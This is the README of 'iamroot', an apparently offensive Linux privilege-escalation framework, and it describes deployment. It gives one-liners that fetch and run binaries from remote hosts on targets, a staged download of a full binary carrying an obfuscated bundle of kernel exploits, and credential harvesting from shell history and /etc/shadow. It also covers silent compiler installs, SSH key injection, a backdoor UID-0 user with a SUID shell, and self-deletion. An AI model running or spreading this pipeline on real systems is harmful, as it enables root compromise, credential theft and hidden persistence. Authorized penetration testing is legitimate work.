# iamroot — Linux Privilege Escalation Framework (Go + Python)

`iamroot` is a Linux local privilege-escalation auditor and exploit pipeline, splitting the work by language strength:

## Two-stage architecture

The **audit** and the **exploitation** are deliberately split:

| | Stage 1 — audit (this repo) | Stage 2 — LPE (private mirror) |
|---|---|---|
| Where | GitHub, public source | Your server's domain only |
| Capability | audit, detection, CVE ranking — **no exploitation** | full binary with embedded exploit payloads |
| Artifact | audit binary (`payloads.public.enc` placeholder — decode fails by design) | `iamroot-full-linux-*` built from the same tree with the real bundle |

Flow on a target:

```
bash -c "$(curl -fsSL https://DOMAIN/iamroot)"   ← installs + runs the audit binary
        │  audit + detection report
        ▼
  audit build fetches https://DOMAIN/stage2      ← internal/stage2
        │  stage2.sh: arch-detect, download, verify
        ▼
  https://DOMAIN/private/iamroot-full-linux-ARCH  ← full binary runs, exploits
```

The exploit C sources and the real payload bundle exist only on the
maintainer's machine and inside the full binary served from `/private/` — never
in this repository, in any form.

Operators: to build + ship a new full binary, on the dev machine
(`payloads/src/*.c` present):

```bash
sh scripts/encrypt-payloads.sh                    # regenerate the bundle (gitignored)
make private-bundle CB_HOST=<host>               # → ./private/iamroot-full-* + SHA256SUMS
# serve ./private/ on the stage-2 host (iamroot.victorsec.com/private/)
rsync -av private/ SERVER:/opt/iamroot/private/
```

The stage-2 URL is baked in [internal/stage2/stage2.go](internal/stage2/stage2.go)
(`DefaultURL`) and overridable at runtime with `IAMROOT_STAGE2_URL`.


- **Go** — orchestrator. One statically-linked binary; goroutines drive the
  concurrent audit collectors and the exploit-scan fan-out (no sequential module scanning).
- **Python** — exploit implementations. `ctypes` syscalls (DirtyPipe splice),
  `struct` ELF packing, `re` credential harvesting, `urllib` HTTP (DirtySock
  snapd). The helpers are embedded into the Go binary via `go:embed` and written
  to a tmpfs workdir at runtime.

The result is a single ~6 MB Linux ELF with no target-side dependencies beyond
the target's own `python3` (and optionally `gcc` for compile-dependent CVEs).

---

## Quick Start

### Install on a target (one-liner)

From a GitHub release (works once the repo is published — see *Distribution*):

```bash
bash -c "$(curl -fsSL https://iamroot.victorsec.com/iamroot)"
```

Self-hosters: build from this repo and serve it anywhere — point
`IAMROOT_BASE` at your mirror (see `scripts/install.sh`).

The installer detects the architecture (amd64/arm64), downloads the right
static ELF, verifies it against `SHA256SUMS` when available, and makes it
executable. `IAMROOT_BASE`, `IAMROOT_OWNER`, `IAMROOT_REPO` env vars override
the download source; `--to DIR` sets the install directory.

### Manual

```bash
# On the build host (macOS or Linux) — cross-compile
make all                      # → dist/iamroot-linux-amd64 + -arm64 + SHA256SUMS

# Upload to target
scp dist/iamroot-linux-amd64 user@target:/dev/shm/iamroot
ssh user@target "chmod +x /dev/shm/iamroot"

# Run on target
/dev/shm/iamroot
```

No target-side build step. The Python helpers ride inside the binary.

---

## Usage

```
iamroot [--complete] [--harvest] [--skip-audit] [--suggest] [--persist] [--list] [--selftest-py]
```

| Flag | Description |
|---|---|
| *(none)* | Concurrent audit + two-pass exploit pipeline (no persistence) |
| `--complete` | Full audit then the pipeline |
| `--harvest` | Credential harvest from web/app configs only |
| `--skip-audit` | Skip Phase 1 audit, go straight to exploits |
| `--suggest` | Exploit suggester: match kernel→CVE (advisory, no execution) |
| `--persist` | Also write a backdoor UID-0 user after a successful exploit |
| `--list` | Dry-run: scan + rank modules, no exploitation |
| `--selftest-py` | Extract embedded Python helpers and run each `--selftest` |

### Auth gate (opt-in)

By default iamroot runs open (research mode). To require a password, set:

```
IAMROOT_PASS_HASH=$(printf %s 'yourpass' | sha256sum | cut -d' ' -f1)
IAMROOT_PASS=yourpass /dev/shm/iamroot
```

---

## How It Works

### Phase 1 — Audit (concurrent)

Each collector runs in its own goroutine and owns a disjoint slice of the
`AuditFindings` struct: kernel/env, hardening (KASLR/SMEP/SMAP/PTI/SELinux/
AppArmor), SUID hunt, sudo version + privileges, capabilities, sensitive-file
perms, group membership (docker/lxd), LSM state, ksmbd. The merged findings feed
every module's `CheckVulnerable` so detection reuses cheap facts.

`--suggest` additionally matches the kernel version against a curated CVE table.

### Phase 1b/1c — Loot + build deps

Passive credential gathering (shell history, `/etc/shadow` unshadow) deposits
passwords into the global cred store, consumed by `SudoPasswdSpray`. If no C
compiler is present, iamroot attempts a silent `apt`/`dnf` install of `gcc` and
`linux-headers-$(uname -r)`.

### Phase 2 — Exploit Pipeline

**Pass 1 — instant misconfigurations** (ordered, first-match wins):
`PasswdInject`, `SuidGtfobins`, `RootGroupAbuse`, `SshKeyInject`, `WwsuidOverwrite`.

**Pass 2 — concurrent scan + confidence-ordered run**: every module's
`CheckVulnerable` is fanned out across goroutines; viable modules are sorted by
confidence DESC (tie-break: base priority ASC) and run sequentially. The first
`Run()` that returns true stops the pipeline.

Every `VULNERABLE` line is annotated with a CVE+NVD URL (parsed from the module
name) or a MITRE ATT&CK TTP for non-CVE techniques.

---

## Module tiers

| Tier | Meaning | Examples |
|---|---|---|
| **A** | Fully working, Go-native (misconfig/config checks) | PasswdInject, SuidGtfobins, SshKeyInject, NopasswdSudo, CapabilityAbuse, DockerEscape, LxdEscape, WritableCron/Service/Timer/Path, NfsNosquash, MysqlUdf, EnlightenmentSuid, … |
| **B** | Fully working, Python via `pylib` | DirtyPipe (ctypes splice), DirtySock (snapd REST), CopyFail (AF_ALG), CredentialHarvest |
| **C** | Kernel CVE exploits with **embedded C source** — compiled on the target with gcc (or a pre-built binary if you uploaded one) and run | PwnKit, BaronSamedit, CopyFail, DirtyFrag, Fragnesia, DirtyClone, PeditCow, CgroupUaf, PtraceCred, Pack2TheRoot. Others (DirtyCow, OverlayFS trio, nf_tables trio, LooneyTunables, eBPF, ksmbd, …) are detection + pre-built-binary only (no embedded source for those) |
| **D** | Advisory only (no execution) | the `--suggest` kernel→CVE scanner |

### Pre-built payloads (Tier C)

Tier-C modules prefer a pre-built payload binary. Upload one to the
work dir and it is detected automatically:

```bash
mkdir -p /dev/shm/nftables_uaf
scp nftables_exploit user@target:/dev/shm/nftables_uaf/exploit
```

Without a payload (and without gcc), a Tier-C module prints the expected upload
path and returns false so the pipeline continues.

### Exploit sources are not in this repository

The C sources for the ten embedded payloads live only on the maintainer's
machine (`payloads/src/`, gitignored). The repo and every release binary carry
a single obfuscated bundle, `payloads/bin/payloads.enc`, which the runtime
unpacks before compiling on the target. This is deliberate obfuscation against
casual reading — not secrecy: the key ships in `payloads/embed.go` and the
runtime must materialize plaintext for gcc, so a determined user of the binary
can recover the sources.

Maintainer regeneration loop after editing any `.c`:

```bash
sh scripts/encrypt-payloads.sh && make build
```

---

## Persistence (opt-in)

Without flags, a successful exploit leaves only the SUID shell it created. With
`--persist` it additionally writes a backdoor UID-0 user, drops a SUID bash at
`/var/tmp/.iamroot_rootbash`, and (if `IAMROOT_PUBKEY` is set) injects an SSH
key into `/root/.ssh`.

| Env var | Purpose |
|---|---|
| `IAMROOT_PUBKEY` | SSH public key to inject into `/root/.ssh` (persistence) |
| `IAMROOT_HARVEST_DIRS` | Dirs for `--harvest` (default `/var/www /srv /opt /etc /home`) |
| `IAMROOT_STAGE2_URL` | Override the stage-2 script URL (audit build) |

---

## Cleanup

iamroot self-deletes on exit and removes its workdirs. Manual cleanup of
persistence artifacts:

```bash
rm -f /var/tmp/.iamroot_rootbash /var/tmp/.rootbash_* /var/tmp/.suid_bash /var/sh
# if --persist was used:
sed -i '/^iamroot:/d' /etc/passwd
# remove an injected SSH key from /root/.ssh/authorized_keys manually
```

---

## Repository layout

```
cmd/iamroot/main.go            entrypoint: auth gate, phases, pipeline, cleanup
internal/
  audit/                       concurrent collectors → AuditFindings; CVE suggester
  exploit/                     Exploit interface, registry, concurrent pipeline, annotate
    modules/                   every exploit module (tiers A/B/C/D), self-registering
  loot/ creds/                 passive intel + thread-safe cred store
  pyrunner/                    go:embed bridge to the Python helpers
  callback/ persist/           config-gated callback + opt-in reversible persistence
  version/ sysutil/            kernel/sudo version parsing + build-tagged syscalls
pylib/                         embedded Python helpers (dirtypipe, elfgen, copyfail, …)
Makefile README.md
```

(`CLAUDE.md` and `.claude/` are local-only — gitignored, never published.)

## Verification

```bash
make vet                       # go vet ./...
make test                      # go test ./...  (version ranges, pipeline sort, annotation)
make selftest                  # extract pylib, run every helper's --selftest
make dryrun                    # detection-only dry-run
make all                       # cross-compile linux/amd64 + linux/arm64
```

---

## Distribution

Two deployment paths; they compose (GitHub as source of truth, your domain as
the front for reliability).

### A. GitHub (public, contribution-friendly)

```bash
cd iamroot
# point the module at your handle first (see below)
git init && git add -A && git commit -m "iamroot: initial release"
git remote add origin git@github.com:cleissonamanacio/iamroot.git
git branch -M main && git push -u origin main

git tag v0.1.0 && git push --tags     # CI builds + publishes the release
```

`.github/workflows/release.yml` cross-builds both architectures, generates
`SHA256SUMS`, and attaches the binaries **plus `install.sh`** to the release —
which gives the stable one-liner:

```bash
bash -c "$(curl -fsSL https://github.com/cleissonamanacio/iamroot/releases/latest/download/install.sh)"
```

### B. Your own domain — Docker Compose mirror (recommended)

Hardened boxes often block github.com egress; a VPS you control is the most
reliable source. The repo ships a self-contained mirror: a multi-stage Docker
image that **builds both architectures inside the container** (no Go toolchain
needed on the server) and serves them with Caddy.

On the server (Ubuntu 22.04 with Docker already running):

```bash
git clone https://github.com/cleissonamanacio/iamroot.git /opt/iamroot
cd /opt/iamroot
docker compose up -d --build
curl -fsSL http://localhost:8080/SHA256SUMS     # smoke test
```

Then from any target:

```bash
bash -c "$(curl -fsSL http://SERVER_IP:8080/iamroot)"
```

Updates are the whole deployment loop:

```bash
cd /opt/iamroot && sh deploy/update.sh          # git pull + rebuild + health check
```

Ports and TLS live in [docker-compose.yml](docker-compose.yml) and
[deploy/Caddyfile](deploy/Caddyfile):
- **8080 taken?** change the left side of `ports: "8080:8080"`.
- **Domain + TLS via host nginx** (systemd, Cloudflare Origin Cert — no
  certbot): the container binds `127.0.0.1:8080` only; install
  [deploy/nginx/iamroot.conf](deploy/nginx/iamroot.conf) into
  `/etc/nginx/sites-available/` with the origin cert/key in `/etc/nginx/ssl/`,
  and set the Cloudflare SSL mode to "Full (strict)".
- **Auto-HTTPS without nginx:** set `IAMROOT_SITE=iamroot.victorsec.com` in
  `deploy/.env`, publish `80/443` (blocks are provided, commented), ensure DNS
  points at the server — Caddy handles the Let's Encrypt cert and renewal.
- **Behind an existing reverse proxy** (Traefik/NPM/etc.): keep the ports block
  commented, join its external network (snippet provided), proxy to
  `http://iamroot-mirror:8080`.

Non-Docker alternative — any static file server works:

```bash
make stage    # → dist/{iamroot-linux-amd64, -arm64, SHA256SUMS, iamroot}
rsync -av dist/ user@yourserver:/srv/iamroot/
```

### Public-release hygiene

- No secrets live in this tree — keep it that way; anything real belongs in
  per-engagement environment variables that never get committed.
- The README carries an authorized-testing notice; that plus the config-gated
  design is the same posture as the public PEASS-ng / LES tooling.
- Releases are checksummed; the installer verifies when `SHA256SUMS` is
  reachable.

---

## Note on scope

`iamroot` is a security-research / authorized-pentesting tool. Use only against
systems you own or are explicitly authorized to test.
